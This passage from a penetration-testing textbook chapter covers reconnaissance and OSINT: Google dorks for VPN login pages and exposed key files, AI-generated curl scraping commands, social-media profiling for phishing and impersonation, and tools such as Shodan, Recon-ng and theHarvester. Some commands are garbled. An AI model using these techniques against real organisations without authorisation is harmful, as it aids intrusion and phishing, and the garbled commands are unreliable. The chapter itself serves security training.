refers to testing that involves accessing the target infrastructure to collect information, potentially alerting the host organization of the intrusion. Active footprinting is methodical and intentional, necessitating meticulous preparations to minimize the likelihood of detection.

Methods of active footprinting

• DNS Interrogation: Extracting details about domain configurations and records.

• Social Engineering: Engaging with individuals to retrieve sensitive information.

• Network and Port Scanning: Identifying open ports, services, and potential vulnerabilities.

• User and Service Enumeration: Listing active users, running services, and system

configurations.

While active footprinting provides more accurate and detailed data, it requires careful execution to avoid raising suspicions or triggering defensive mechanisms.

Importance of reconnaissance

The reconnaissance phase lays the groundwork for successful penetration testing. By gather-

ing critical information about the target organization, penetration testers can:

• Identify existing vulnerabilities in the target’s infrastructure.

• Develop targeted attack strategies that minimize unnecessary noise or detection.

• Reduce the overall time spent on subsequent phases of the engagement.

Types of information collected during footprinting

Footprinting involves systematically gathering critical details about the target organiza-

tion, its network, and system infrastructure. These details are categorized into three primary groups: Organizational Information, Network Information, and System Information.

Organizational information

This category focuses on data related to the target organization’s structure, personnel, and publicly available materials. Such information helps in understanding the organization’s

internal and external operations.

• Employee Information: Names, positions, and publicly shared data about employees.

• Phone Numbers: Contact details for official communication.

• Branch Locations: Addresses and geographical details of organizational branches or headquarters.





52 Traditional vs Generative AI Pentesting

• Company History: Background information on the organization, including major

milestones.

• Web Technologies: Platforms, frameworks, and tools used for web infrastructure.

• Public Announcements: News articles, press releases, and related documentation.

Network information

Network- related data reveals the architecture and connections within the organization’s

digital ecosystem. This information provides insight into potential access points for further exploration.

• Domain and Subdomains: Details about the main website and its associated subdomains.

• Network Blocks: Information about allocated IP ranges.

• Network Topology: Details of routers, firewalls, and overall network configuration.

• Accessible IP Addresses: Identification of live IPs and active systems.

• Whois Records: Ownership and registration details for domains.

• DNS Records: Information on domain name system settings and configurations.

System information

This category involves technical details about the systems and platforms used within the

target organization. It forms the foundation for vulnerability identification and exploitation.

• Web Server Operating System: The underlying OS hosting the organization’s web

applications.

• Web Server Locations: Geographical and logical positioning of the servers.

• Public Email Addresses: Official email addresses accessible to the public.

• Usernames and Passwords: Leaked or publicly available login credentials (if any).

Footprinting methodology

Following the introduction of fundamental concepts and the importance of footprinting,

we will now examine the footprinting methodology as a systematic, step- by- step process

for gathering pertinent information about a target organization from diverse sources. The

methodology prioritizes the acquisition of publicly accessible information, facilitating the construction of a comprehensive profile of a target’s network, systems, and organizational

specifics.

Footprinting is the information- gathering process that encompasses URLs, physical loca-

tions, employee details, domain names, contact information, and other related data. This aids in comprehending the security stance of an organization and the specific attack scenarios that may be occurring.

Key sources for information gathering

The information is typically collected from publicly accessible sources, including:

• Search Engines: Tools such as Google, Bing, and others are used to find indexed data about the target organization.





GenAI-driven reconnaissance for effective penetration testing 53

• Social Networking Platforms: Sites such as LinkedIn, Facebook, and Twitter provide details on employees, job postings, and company activities.

• Whois Databases: These databases reveal registration details of domain names, including ownership and hosting providers.

• Publicly Available Resources: Open databases, forums, and archives.

Methodological approach

The footprinting methodology ensures a systematic and thorough process for data collection: 1. Identify key data points, such as domain names, IP ranges, and organizational structure.

2. Use OSINT (Open- Source Intelligence) techniques to collect the information.

3. Organize and analyze the gathered data to identify patterns, connections, and potential weaknesses.

This step- by- step approach ensures that footprinting is efficient, comprehensive, and effective in uncovering critical information to guide further penetration testing phases.

Figure 3.1 provides an illustration of the techniques used for collecting information from multiple sources during the footprinting process.

There are many resources and tools available for information gathering:

• Search engines

• Social media

• Websites that specialize in collecting public information about organizations

• OSINT tools

• Social engineering methods.

Footprinting through search engines

Search engines are one of the most effective tools for collecting critical information about a target organization during the reconnaissance phase. They play a significant role in extracting publicly accessible data by leveraging automated software, commonly referred to as web

crawlers. These crawlers continuously scan and index active websites, storing the collected data in large, searchable databases.

When a user queries a search engine, the system generates a list of Search Engine Results Pages (SERPs), which include a variety of file types such as web pages, images, videos, and documents, ranked by relevance. These results often provide a wealth of information about

the target organization.

Information extracted through search engines

Search engines can uncover various details about a target organization, including:

• Technology Platforms: Details about frameworks, software, and tools used.

• Employee Information: Publicly available data such as employee profiles.

• Login Pages and Intranet Portals: Entry points for accessing internal systems.

• Contact Information: Official email addresses and phone numbers.



54 Traditional vs Generativ

e AI P

entesting

Figure 3.1 Footprinting techniques.





GenAI-driven reconnaissance for effective penetration testing 55

Applications in footprinting

The information retrieved through search engines can be instrumental in:

• Facilitating social engineering attacks by leveraging employee or organizational data.

• Identifying exposed systems or services, such as login portals.

• Mapping out the organization’s digital presence for advanced targeting.

By utilizing search engines effectively, penetration testers can gain crucial insights into the target organization without direct interaction, maintaining stealth and anonymity during the reconnaissance phase. Search engine results can differ in many ways, contingent upon the

last time the engine indexed the material and the methodology employed to ascertain page

relevance.

Google

• The phrase “Google Hacking” was popularized by Johnny Long in 2001. Through sev-

eral discussions and a widely acclaimed book (Google Hacking for Penetration Testers),

he elucidated how search engines such as Google may be utilized to reveal essential

information, flaws, and websites (Toffalini et al., 2016).

• This approach relies on sophisticated search strings and operators that facilitate the

refining of search queries, compatible with several search engines. The procedure is

iterative, first with a comprehensive search, subsequently refined using operators to

exclude irrelevant items or unengaging results (Calishain & Dornfest, 2003).

• Google offers many sophisticated operators that enhance search modification. Utilize

Google’s Advanced Operator to refine online searches with the Google Search tool.

Inquiries are permitted, and information tailored to specific targets is accessible. Table

3.1 shows the most commonly used search operators.

Example of using google operators



• The syntax of Google operators [intitle:internet inurl:intranet +intext:"human

resources"] is employed to locate sensitive information on a firm and its work-

ers. Pentesters can utilize this knowledge to initiate a social engineering campaign.

Figures 3.2, 3.3 and 3.4 shows an example of a Google search with different operators.

Table 3.1 Google search operators

Research service

Search operators

Web Search

allinanchor:, allintext:, allintitle:, allinurl:, cache:, define:, filetype:, id:, inanchor:, info:, intext:, intitle:, inurl:, link:, related:, site:

Image Search

allintitle:, allinurl:, filetype:, inurl:, intitle:, site:

Groups

allintext:, allintitle:, author:, group:, insubject:, intext:, intitle:

Yearbook

allintext:, allintitle:, allinurl:, ext:, filetype:, intext:, intitle:, inurl:

News

allintext:, allintitle:, allinurl:, intext:, intitle:, inurl:, location, source:

Product Finder

allintext:, allintitle:





56 Traditional vs Generative AI Pentesting

Figure 3.2 Example of Google search with operators.

Figure 3.3 Example of a Google search with inurl operator.





GenAI-driven reconnaissance for effective penetration testing 57

Figure 3.4 Example of Google search with site and intitle operators.

• The Google Hacking Database (GHDB) comprises an extensive collection of inventive

queries that illustrate the efficacy of innovative search techniques utilizing combination

operators, as shown un Figure 3.5.

• Google Hacking Database (GHDB): http:// www. hackersforcharity. org.

• Google Dorks: http:// www. exploit- db. com.

Figure 3.5 Google dork.





58 Traditional vs Generative AI Pentesting

Figure 3.6 Google advanced search.

• Gathering information using Google’s Advanced Search:

• Utilizes Google’s advanced search feature to identify websites that may connect to

the target company’s site.

• This can extract information on partners, vendors, customers, and other associa-

tions related to the target website.

• Utilizing Google’s advanced search feature enables more specific online searches

(Figure 3.6).

Metasearch engines

• Metasearch engines, sometimes referred to as search aggregators, are online platforms

that consolidate results from many search engines for a certain phrase or keyword with

their own algorithms. Similar to other web search engines, it extracts data from them.

Users may input a single query and obtain results from several sources, enabling them

to quickly identify the most accurate answers from diverse information (Augustyn &

Tick, 2020).

• Pentesters can utilize metasearch engines such as Startpage (Figure 3.7), MetaGer, and eTools.ch to simultaneously query several search engines and obtain comprehensive

information from e- commerce platforms (e.g., Amazon, eBay), as well as photographs,

videos, and blogs from many sources.

• Metasearch engines enable the concealment of pentesters’ identities by obscuring their

IP addresses.





GenAI-driven reconnaissance for effective penetration testing 59

Figure 3.7 The Starpage metasearch.

Footprinting using advanced Google hacking techniques with AI

Artificial intelligence- driven technologies have transformed the footprinting process to be more efficient and automated. AI utilizes sophisticated Google hacking methodologies,

enabling penetration testers or attackers to exert minimal effort in acquiring intelligence on their target organization.

AI- driven tools such as ShellGPT aid testers by automating intricate search queries and

systematically collecting accurate data points. These tools substantially augment conven-

tional Google hacking methods by optimizing the procedure, enhancing precision, and reduc-

ing manual effort.

Example of AI- powered Google hacking

A practical example of how AI can be used for footprinting, as shown in Figure 3.8.

An attacker can prompt an AI- powered tool with the following query: “Use filetype search operator to obtain PDF files on the target website eccouncil. org and store the result in the

recon1.txt file.”





60 Traditional vs Generative AI Pentesting

Figure 3.8 Prompt for advanced Google hacking with AI.

The text presents a straightforward request instructing AI to retrieve particular document

types (e.g., PDF files) from a designated website for subsequent processing. Consequently,

insights regarding the internal mechanisms, policies, or configurations of the target will be revealed.

Advanced Google hacking with shell command

The following shell command automates Google hacking to extract PDF files from the

certifiedhacker. com domain and saves the results to a file named recon1.txt:

lynx --dump " http:// www. google. com/ search? q= site: eccouncil. org+ filetype:

pdf" | grep "http" | cut -d "=" -f2 | grep -o "http[^&]*" > recon1.txt Here is the breakdown of the command:

• lynx --dump: Uses the Lynx browser in dump mode to retrieve Google search results.

• grep "http" : Filters lines containing URLs.

• cut -d "=" -f2: Splits each line by the = delimiter and extracts the second field.

• grep -o "http[^&]*" : Extracts valid URLs.

• recon1.txt: Saves the final output to the file recon1.txt.

This command efficiently automates the extraction of specific files from a target domain

using Google’s search operators, as shown in Figure 3.9.

Figure 3.9 Output for advanced Google hacking with AI.





GenAI-driven reconnaissance for effective penetration testing 61

Table 3.2 Google Dork operators

Google Dork

Description

inurl:"/sslvpn_logon.shtm" intitle:"User

Finds pages containing login portals.

Authentication" "WatchGuard Technologies"

inurl:/sslvpn/Login/Login

Locates VPN login portals.

site:vpn.*.* intitle:"login"

Retrieves various VPN login pages.

inurl:weblogin

Identifies hosts with vulnerabilities related to Zyxel

devices.

intitle:"index of" /etc/openvpn/

Retrieves OpenVPN sensitive directories.

"-----BEGIN OpenVPN Static Key V1- ----" ext:key

Finds OpenVPN static keys.

intitle:"index of" "vpn- config.*"

Retrieves information about VPN configuration files.

Index of /.ovpn

Finds OpenVPN configuration files and certificates.

inurl:"/vpn/tmindex.html" vpn

Locates Netscaler and Citrix Gateway VPN login

portals.

intitle:"SSL VPN Service" + intext:"Your system

Finds Cisco Adaptive Security Appliance (ASA) login

administrator provided the following information"

pages.

VPN footprinting through Google hacking

Using Google hacking techniques, which consist of specific search engine operators referred to as “Google dorks,” one can uncover additional information regarding Virtual Private

Networks (VPNs). These techniques may reveal sensitive pages, including VPN login inter-

faces, directories with configuration files, or server keys. A list of prevalent Google dorks employed for VPN footprinting is presented in Table 3.2. Using Google hacking techniques, which consist of specific search engine operators referred to as “Google dorks,” one can

uncover additional information regarding Virtual Private Networks (VPNs). These tech-

niques may reveal sensitive pages, including VPN login interfaces, directories with configuration files, or server keys.

These queries offer an effective method to identify VPN-

related vulnerabilities or

misconfigurations.

Automating VPN footprinting with AI

The incorporation of AI can automate certain Google hacking procedures via interfaces such

as ChatGPT or ShellGPT, thereby facilitating the collection of VPN information. Users utilize AI tools to perform tasks that retrieve highly specific information.

Here is an example task to locate Fortinet VPN login pages. The following command can

be executed using AI tools:

Prompt: sgpt --chat footprint --shell "Use inurl search operator to obtain the Fortinet VPN

login pages"

This command fetches Google search results, filters URLs, and formats them for further

analysis, as shown in Figure 3.10.





62 Traditional vs Generative AI Pentesting

Figure 3.10 Prompt for footprinting of fortinet VPN login pages via Google dorking.

Figure 3.11 Use inurl search operator to obtain the Fortinet VPN login pages.

Upon execution, the command generated by ShellGPT executes (Figure 3.11):

curl -s " https:// www. google. com/ search? q= inurl:/ remote/ login+ Fortinet+

VPN" -A "Mozilla/5.0" | grep -oP '(?<=<a href=")[^"]*' > fortinet_vpn_

login_pages.txt

Command Breakdown:

1. curl: Sends a request to Google to perform a search for URLs containing /remote/login

and Fortinet VPN.

2. -A “Mozilla/5.0”: Sets a user- agent string to mimic a browser, avoiding being blocked

by Google.

3. grep -oP '(?<=<a href=")[^"]*': Extracts only the URLs from the HTML response using a Perl- compatible regular expression.

4. >: Redirects the extracted URLs into a file for review and further analysis.





GenAI-driven reconnaissance for effective penetration testing 63

5. Output File: The file fortinet_vpn_login_pages.txt contains the list of potential login

page URLs.

Using AI tools for such tasks enhances efficiency, reduces manual effort, and enables large-scale reconnaissance effectively.

NetCraft: Website search engine

• Netcraft is a UK- based internet service provider that offers a web gateway for several

information- gathering purposes, as shown in Figure 3.12.

• The utilization of services provided by Netcraft is regarded as a passive method, as

there is no direct interaction with the target.

• Let us examine many of Netcraft’s functionalities. For instance, we may utilize the DNS

lookup service provided by Netcraft ( https:// searchdns. netcraft. com) to obtain infor-

mation on the certifiedhacker. com domain.

• For every identified server, we may get a “site report” including more information and

historical data by selecting the file icon adjacent to each URL site (Figure 3.13). The report starts with the registration details. Upon scrolling down, we encounter many

entries pertaining to “site technology”.

This compilation of subdomains and technologies will be advantageous as we proceed with

active information collecting and exploitation.

Figure 3.12 Netcraft search engine.





64 Traditional vs Generative AI Pentesting

Figure 3.13 Netcraft search.

Social media

• Locating an individual in a social network is straightforward. Social media are internet platforms designed to link individuals and facilitate the creation of interpersonal networks. These social networks contain information provided during registration and/or

usage. These trainings establish connections among individuals based on shared inter-

ests, geographical areas, or educational backgrounds, among other factors.

• Social networking platforms such as LinkedIn, Instagram, Twitter, Facebook, TikTok,

and Snapchat enable users to locate individuals by name, keyword, company, edu-

cational institution, friends, and acquaintances. Searching for individuals on these

platforms yields not only personal data but also professional information, including

corporate affiliation, postal address, telephone number, email address, photographs,

and videos, among others.

• Platforms such as Twitter are utilized for disseminating advice, information, views, or

rumors. From these shares, pentesters can gain a comprehensive picture of the targets

for their assaults.

Example: LinkedIn

• LinkedIn is unparalleled as a professional social network. A plethora of its users are

candid about their experiences, revealing the intricacies of the technology and processes

involved.

• By examining the site, we may get insights about the company’s technology, pinpoint

possible phishing targets, and compile a list of prospective roles.

• For smaller enterprises lacking a substantial online presence, LinkedIn serves as a valuable source of open- source intelligence (OSINT).



GenAI-driven reconnaissance for effective penetration testing 65

Here is the employment information:

• Individuals often utilize LinkedIn as a resource for discovering employment prospects;

thus, corporate websites include pertinent information for job seekers, including the

current staff count and any fluctuations in that figure.

• Understanding the average duration of each employee enhances our communication

with targets regarding phishing and other types of email fraud.

• In large corporations with over 300,000 employees, we can estimate the likelihood that

one individual may be acquainted with an employee from a different location.

• Similarly, we may ascertain the probability of seeing a new recruit by contacting the

offices and reviewing LinkedIn’s statistics on employee distribution, growth, and new

recruits.

Following is the general company information.

Here is Walmart’s LinkedIn profile for your review (Figure 3.14).

• The top of the page displays a ticker symbol, a company overview, the number of

Walmart subscribers, and the count of logins from this account associated with Walmart

employees.

• The About Us section offers general information on Walmart.

• A comprehensive analysis of Walmart’s history, encompassing its inception date and

location, headquarters, scale, and areas of expertise, may be found lower down the

page. The website and addresses of all major Walmart locations are also available there.

* A LinkedIn Premium membership is required to see some content.

Figure 3.14 LinkedIn search.



66 Traditional vs Generative AI Pentesting

Figure 3.15 Searching for LinkedIn profiles.

The following list details about the employees of the company (Figure 3.15):

• Employees of the firm who use LinkedIn are enumerated on a separate page. Familiarize

yourself with each individual’s role by engaging with it. As a cybersecurity expert, an

infiltration Analyst must meticulously monitor the organization’s online presence and

internal networks for indications of infiltration. The quantity of individuals assigned to

safeguard critical corporate data serves as an indicator of its protective measures.

• A straightforward method is to search for certification acronyms inside personnel pro-

files. Commencing with certificates such as CISSP, GPEN, OSCP, CEH, or Security+ is

highly advisable. Information security, cybersecurity, intrusion, and chief information

security officer are all commendable career titles to pursue.

• The technologies utilized by the firm may also be inferred from these people profiles.

We can ascertain the presence of VPNs, antivirus software, email filters, or security

event and incident management (SEIM) solutions through investigation. Additionally,

they aid in the compilation of a mailing list that may be utilized for further phishing

and profiling objectives.

The following list details the job boards and career sites (Figure 3.16):

• Social media serves as an excellent platform for recruiters, outsourced personnel, and

recruitment agencies to advertise available openings and career websites. This data is a

valuable resource for penetration testers seeking possible armament.

• Significant information may be found in the job description. A candidate’s proven pro-

ficiency with Oracle E- Business Suite (EBS) version 12.2 indicates that this is or will be the version utilized by the firm.

• This job post may deceive a prospective attacker into believing that the firm continues

to utilize an obsolete version, such as 11.5.10.2, which harbors security vulnerabilities

originating from 2006.





GenAI-driven reconnaissance for effective penetration testing 67

Figure 3.16 Searching for job postings on LinkedIn.

• Initially, we can investigate certain software- related common flaws and exposures

(CVEs) (Hankin & Malacaria, 2022). Subsequently, we may utilize sites such as https://

www. exploit- db. com to identify exploit codes.

• Conversely, we may initiate a phishing campaign with this data.

• Finally, we may attempt to employ brute force on all public instances of the problem-

atic software; this would be the most apparent approach, transcending social engineer-

ing and open- source intelligence.

Example: Facebook

Depending on your inquiry and objective, Facebook may serve as a valuable repository of

knowledge. This is attributable to the plethora of data, but not all of it has been meticulously scrutinized. Many folks tend to overshare on this platform.





68 Traditional vs Generative AI Pentesting

Impersonating a customer is a deceptive strategy employed to get an employee to engage

with you when you are targeting a business. Visiting the Facebook page and reviewing assessments allows you to uncover several genuine consumers.

While some valid issues are presented, there are also conspiracy theories, unsubstantiated

claims, efforts at virus dissemination, and accusations of impersonation or fraudulent pages (Zaoui et al., 2024).

OSINT automation tools

Finding the target’s domain and subdomains

• Verify the company’s URL in the Letter of Commitment or utilize a search engine such

as Google or Bing.

• Subdomains signify distinct applications and facilitate the visualization of a target

organization’s attack surface.

• Subraw Tool: SubBrute is an open- source subdomain enumeration tool that uses DNS

query brute- forcing to identify subdomains linked to a given domain. It was created in

Python and is operable via the command line. Following are a few characteristics of

SubBrute:



1. Subdomain Search: SubBrute employs a brute- force technique to identify available

subdomains through DNS queries. It exhaustively tests all potential subdomain

name combinations until it identifies those that genuinely exist in relation to the

target domain.



2. SubBrute employs multiple data sources to ascertain subdomain names, encom-

passing DNS servers, records, email logs, and prevalent passwords.



3. Filter Management: SubBrute allows for the filtration of results based on various

criteria, including the length of subdomain names and the presence of specific let-

ters or words.

SubBrute can be integrated with other penetration testing tools such as Nmap and Metasploit to deliver a comprehensive analysis. To utilize SubBrute, retrieve the code from the GitHub repository and install it on your device. You can execute the command- line utility by specifying the target domain along with any desired filtering preferences. It is essential to recognize that subdomain enumeration can be an extremely resource- intensive and protracted

endeavor. Furthermore, it could constitute a legal infraction if executed without obtaining permission from the owner of the target domain. Consequently, it is imperative to consistently adhere to this method in an ethical and responsible manner, in accordance with applicable local laws and regulations.

Here’s an example command to use SubBrute (Figure 3.17):

1. Open a command console.

2. Download and install SubBrute by running the following command:

git clone https:// github. com/ TheRook/ subbrute.git

Subraw CD

python setup.py install

3. Run the following command to start the subdomain lookup for the target domain

“certifiedhacker.com”:



GenAI-driven reconnaissance for effective penetration testing 69

Figure 3.17 Subraw tool.

Nmap is an open- source tool utilized for scanning networks, hosts, and services to identify potential vulnerabilities. Nmap employs the “dns- brute” option to conduct brute- force DNS

lookups for potential subdomains associated with a target domain via DNS queries. The

subsequent points delineate the “dns- brute” option of Nmap:

1. Nmap employs DNS query brute- forcing to identify subdomain names associated with

a target domain.

2. Nmap provides the capability to create a custom dictionary of subdomain names for

search purposes.

3. Filter Management: Facilitates the filtration of results according to specific attributes or characteristics, including the length of subdomain- valued parameters and the occurrence of a particular letter or word.

4. Nmap can be integrated with other penetration testing tools, including Metasploit and

Nexpose, for comprehensive analysis of the results.

To utilize the “dns- brute” feature in Nmap, you must first install Nmap on your computer

(Figure 3.18). Subsequently, you will input the command in the command line, designating the target domain and filter parameters: nmap -p 53 --raw dns- script <target domain>.

DNSmap is a useful open- source tool for extracting information from the DNS records

linked to a domain. Initially a basic tool for mapping names, DNSmap has evolved to query



70 Traditional vs Generative AI Pentesting

Figure 3.18 Using Nmap with DNS- brute.

DNS and collect information regarding DNS records, including domains, IP addresses, MX

records, SOA records, NS records, and others.

Some features of DNSmap include:

1. Subdomain Search: DNSmap can execute subdomain searches within a repository of

subdomain names to identify the corresponding subdomains linked to a target domain.

2. Domain Name Fuzzing: DNSmap employs fuzzing techniques to identify intriguing

names that are otherwise inaccessible.

3. DNS Response Analysis: DNSmap possesses the functionality to analyze DNS responses

for specific vulnerabilities, including misconfigured or malicious DNS records.

4. Custom Dictionaries: DNSmap enables the specification of custom dictionaries for the

examination of various subdomains during your search.





GenAI-driven reconnaissance for effective penetration testing 71

Figure 3.19 DNSMAP tool.

Prior to utilizing this program, it is necessary to install DNSmap on your computer (Figure

3.19). Subsequently, from the command line, you may execute it using the pertinent command, designating the target domain and the required filtering parameters:

DNSMAP <target domain>

Fingerprinting the target using Shodan

Shodan is a search engine designed to identify specific online- accessible devices and their categories that are live and exposed on the internet. It can recognize devices such as cameras, routers, switches, and other Internet of Things (IoT) devices linked to the internet (Matherly,

2015). Shodan locates all devices with identifiable geographic positions and all internet-connected users of those devices. It examines all devices connected to the internet that are currently accessible. The user can filter by connection type utilizing city, country, latitude/

longitude, hostname, operating system of the target device, and IP address. Additionally,

the penetration tester can conduct a search across Exploit DB, Metasploit, CVE, OSVDB,

or Packetstorm for recognized vulnerabilities and exploits within a unified interface. This data aids penetration testers in identifying potential vulnerabilities and exploits. The screen example shown in Figure 3.20 illustrates the utilization of Shodan to locate Cisco routers globally via public IP addresses.

The following exemplifies the utilization of Shodan to identify internet- connected devices: 1. Navigate to the Shodan login page: https://www.shodan.io

2. Enter your preferred search term in the search box to locate internet- connected devices.

To locate Apache servers, enter “Apache.”

3. Press the “Search” button to initiate the search.

4. The search results will be presented in a list that includes the IP address, open ports, software version, and additional information.

5. The search results can be refined by various geographical factors, including device type and software version.

6. Clicking on each search result takes you to find out more information on the device,

including open ports, possible vulnerabilities, configuration, and much more.

Figure 3.20 shows an example to search for CISCO routers around the world with their public address.



72 Traditional vs Generativ

e AI P

entesting

Figure 3.20 Example of searching on Shodan on CISCO routers.





GenAI-driven reconnaissance for effective penetration testing 73

Figure 3.21 shows an example to search for webcams around the world with their public address.

Recon- ng: An OSINT tool Web

• Recon- ng is an open- source, modular framework intended for the acquisition of infor-

mation from the internet. Recon- ng is designed to automate reconnaissance tasks in

penetration testing, enabling the collection of information regarding targeted domains,

IP addresses, email addresses, social media profiles, and other entities. Recon- ng is pre-

installed on Kali Linux.

• To utilize Recon- ng, you must first install it on your system and establish a database to store the reconnaissance results (Figure 3.22). Subsequently, you can initiate Recon- ng by entering “recon- ng” in a terminal, which will provide access to various reconnaissance modules designed to collect information about targets. Utilize recon- ng to aggre-

gate information regarding certifiedhacker.com. It commences with: recon- ng.

• Use Recon Modules: Recon- ng comes with many recon modules that are pre- configured

to collect information about targets. Here’s an example command to use the “recon/

domains- contacts/pgp_search” module to collect information about email addresses

associated with a domain.

• Note that some modules are marked with an asterisk in the “K” column. These modules

require credentials or API keys for third- party providers. The recon- ng wiki maintains a

short list of keys used by its modules. Some of these keys are available for free accounts, while others require a subscription.

• Additional information about a module may be obtained by using Marketplace Info

followed by the module’s name (Figure 3.23). Given that GitHub modules necessitate API keys, we shall utilize this command to analyze the module recon/domainshosts/

google_site_web.

• This module utilizes the “site” operator for hackertarget and does not necessitate an

API key. Proceed to install the module using Marketplace Install.

• Having installed and loaded the module, you will see further facts about it in the output (Figure 3.24). The outcome suggests that a source, which is the objective for data collection, is necessary for the module’s operation. We will specify our target domain utilizing

the designated SOURCE options: certifiedhacker.com.

• Finally, we launch the module with run. The request was obstructed by a Google

CAPTCHA. A pentester must consistently identify an alternative option in the face of

an obstruction. Let us employ an alternative module by adhering to similar procedures.

• We will utilize an alternative Hackertarget module that will let us to obtain identi-

cal information by adhering to the same procedural steps: install, load, and execute

(Figure 3.25).

• The command ‘show hosts’ can be utilized to exhibit the stored data (Figure 3.26).

TheHarvester

theHarvester is an open- source reconnaissance program intended to gather information on

targets, including domain names, IP addresses, email addresses, usernames, and social media profiles. Written in Python, theHarvester is capable of gathering information from public

sources, including search engines, social networks, and email services, and collects emails, subdomains, IP addresses, and URLs. theHarvester is pre- installed on Kali Linux (Figure 3.27).



74 Traditional vs Generativ

e AI P

entesting

Figure 3.21 Example of Shodan webcam search.





GenAI-driven reconnaissance for effective penetration testing 75

Figure 3.22 Interface recon- ng.

Figure 3.23 Recon- ng marketplace.

Figure 3.24 Google search with recon- ng.





76 Traditional vs Generative AI Pentesting

Figure 3.25 Result of recon- ng search.

Figure 3.26 Show recon- ng results.





GenAI-driven reconnaissance for effective penetration testing 77

Figure 3.27 theHarvester tool.

Fundamental syntax: The Harvester -d [domain] -l [depth] -b [search engines] -f [filename]

• -d: Designates the domain for scanning.

• -l: Designates the profundity of the analysis. In- depth study necessitates a more gradual pace.

• -b: designates the search engine for doing searches (google, googleCSE, bing, bingapi,

pgp, linkedin, google- profiles, jigsaw, twitter, googleplus, all, etc.) Certain search engines need API keys.

• -f—Designates an output file for the identified findings. The file will be stored in the current directory of your terminal, unless provided differently, in HTML format.

• For more details and advanced options, use the help with theHarvester –h.

• Figure 3.28 shows an example for E- mails: theHarvester -d umd.edu –b bing.

Metagoofil (http://www.edge- security.com )

Metagoofil, a data gathering tool, can extract metadata from a target company’s public documents, including PDFs, Docs, Excel spreadsheets, PowerPoint presentations, and XISX files

(Troia, 2020).

Metagoofil utilizes Google to locate documents, downloads them to a local storage, and

subsequently using libraries such as Hachoir and Förminer to extract metadata. Consequently, penetration testers can gain from a report that enumerates server machine names, software

versions, and users.

Figure 3.29 illustrate an example to conducting a search for documents from the domain

(-d certifiedhacker.com) including doc and PDF files (-t doc, pdf) yields results that include the email addresses associated with that domain.





78 Traditional vs Generative AI Pentesting

Figure 3.28 Search result with theHarvester.

Figure 3.29 Metagoofil tool.

We require a target first, hence we selected the example.com domain and executed Metagoofil against it with the command:

metagoofil -d example.com -l 20 -t doc,pdf -n 5

In this instance, we utilize the -d argument to provide our domain, the -t and -l flags to

delineate the file kinds we seek (20 in all), and the -n parameter to indicate that we wish to upload only five files. The parameters employed in this command can be modified to suit our requirements.





GenAI-driven reconnaissance for effective penetration testing 79

Figure 3.30 Research with metagoofil.

Upon entering the command into our terminal, the results will be shown after a designated

period (Metagoofil requires time for analysis), as illustrated in Figure 3.29.

As our target website is now devoid of content, it is unable to discover any information.

Nevertheless, if we have a constructive objective, it can amass substantial data, as shown in

Figure 3.30.

Mapping Pastebin’s Key Email Addresses and HavelBeenPwned

One may get several email addresses from websites such as Pastebin and Have I Been Pwned

(https://haveibeenpwned.com). These websites are intended for the storage and dissemination of texts (code snippets) online for evaluative reasons. They serve to exhibit data encompassing personal information, including name, address, date of birth, phone number, and

email address, sourced from insecure databases, rendering them a significant origin of email addresses compromised by third parties, as illustrated in Figure 3.31.

Instruments such as Pepe and SimplyEmail may be utilized to gather email addresses.

• Pepe: Capable of aggregating email addresses from Pastebin, Google, Trumail, Pipl, FullContact, and Have I Been Pwned. The user might notify the individual of the

password breach by dispatching an email. It exclusively supports a single format:

email:password.

• SimplyEmail: It is a tool for enumerating emails. Furthermore, it serves as an extension of Harvester, enabling users to effortlessly construct modules for a framework.

SpiderFoot: An OSINT tool recognition

• SpiderFoot, an open- source intelligence tool (Troia, 2020), can autonomously query more than 100 public databases for information including names, IP addresses, domain

names, email addresses, and more data. We explicitly identify the target for investiga-

tion and select the modules to activate. SpiderFoot will gather data to comprehend all

things and illustrate the relationships among them.





80 Traditional vs Generative AI Pentesting

Figure 3.31 HavelBeenPwned website interface.

• SpiderFoot is included by default on the latest iterations of Kali Linux. This is an illustration of a SpiderFoot command utilized to gather domain information from public

sources:

Spiderfoot -d example.com

• This command will gather information on the “example.com” domain from public sources, including search engines and social networks. The recognition results will be

presented in the console and may be exported as CSV, HTML, XML, etc., utilizing the

relevant choices.

• SpiderFoot is accessed via a web interface (Figure 3.32). We initiate a web server locally on port 5151 SpiderFoot –l 127.0.0.1:5151.

Figure 3.32 SpiderFoot tool.





GenAI-driven reconnaissance for effective penetration testing 81

And we visit the url http://127.0.0.1:5151, as shown in Figure 3.33.

The results are displayed in several formats, as illustrated in Figure 3.34.

Figure 3.33 Interface web SpiderFoot.

Figure 3.34 Scan avec SpiderFoot.





82 Traditional vs Generative AI Pentesting

Figure 3.35 SpiderFoot scan details.

Subsequently, we may proceed to the Browse tab and choose each category of results to

scrutinize the details of the collected information, as illustrated in Figure 3.35.

OSINT framework

The OSINT Framework is a classification and repository of open- source intelligence (OSINT) tools and resources designed to assist cybersecurity professionals, investigators, and ethical hackers in collecting publicly accessible information. It is classified and arranged as a repository of instruments that assist in reconnaissance and intelligence acquisition across various domains. This will encompass resources for social media searches, public records, domain

information, compromised credentials, geospatial intelligence, among others. Cybercriminals consistently target ICT systems to disrupt services. This renders the investigation of cybersafe-guards essential, currently encompassing a domain of unresolved cybersecurity challenges.

Contemporary data sciences have emerged as a significant asset in enhancing preventive

measures against attacks, facilitating not only penetration testing within the environmental context but also fortifying open security systems. Mining techniques facilitate the analysis of recurrent attack attempts, accumulate intelligence regarding them, and thus enable informed decisions that enhance countermeasures and optimize timing.

Similarly, OSINT serves as an essential instrument for intelligence gathering in contextual investigations and tracebacks. It assumes particularly vital roles in digital forensics, providing assistance and insight beyond traditional methods to collect supplementary digital evidence

following a security incident (Hwang et al., 2022).

The tools within the framework are classified according to their functions, specifically for email lookups, IP and domain tracking, metadata extraction, and social media analysis. The

organization assists users in navigating and sifting through the vast array of OSINT tools, thereby identifying the most appropriate ones for their investigations. The framework is

extensively utilized by cybersecurity professionals for ethical hacking, red teaming, and penetration testing, as well as by law enforcement agencies to monitor criminal and cybercriminal



GenAI-driven reconnaissance for effective penetration testing 83

activities. As OSINT continues to evolve, the framework will persist in providing superior

options for collecting actionable intelligence while adhering to privacy laws and ethical stan-

dards (Pastor- Galindo et al., 2020; Tabatabaei & Wells, 2016). The OSINT Framework is not designed as a checklist; however, reviewing the categories and tools offered may stimulate

opportunities for additional information gathering (Pastor- Galindo et al., 2020). Figure 3.36

illustrates OSINT framework tools.

This is an illustration of how to gather username data from the OSINT Framework:

1. Visit the OSINT Framework webpage: https://osintframework.com/.

2. Choose the “Domain Name” category in the “Select Category” box.

